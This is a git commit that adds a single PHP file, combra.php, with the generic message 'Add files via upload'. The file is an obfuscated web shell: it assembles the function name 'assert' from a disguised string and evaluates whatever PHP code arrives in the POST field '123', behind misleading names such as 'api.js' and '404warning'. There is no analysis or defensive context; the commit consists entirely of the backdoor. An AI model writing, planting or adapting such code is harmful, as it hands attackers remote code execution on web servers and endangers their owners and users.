3b77fc5fd6dd629bd8618bc9a331137f821d055c
bencelamar <43297303+bencelamar@users.noreply.github.com>
2021-07-09 15:35:24 +0800

    Add files via upload

---
+++ combra.php
@@ -0,0 +1,13 @@
+<?php
+function WPFM($cgi){
+$var=array($api=($fastcgi=($socks=array('api.js'=>$cgi(eval(pix()))))));
+}
+function pix(){
+$blob=$_POST['123'];
+$blob="$blob";
+$exc['404warning']="";
+return $exc['404warning']."$blob";
+}
+$ast=substr_replace("assexx","rt",4);
+WPFM($ast);
+?>
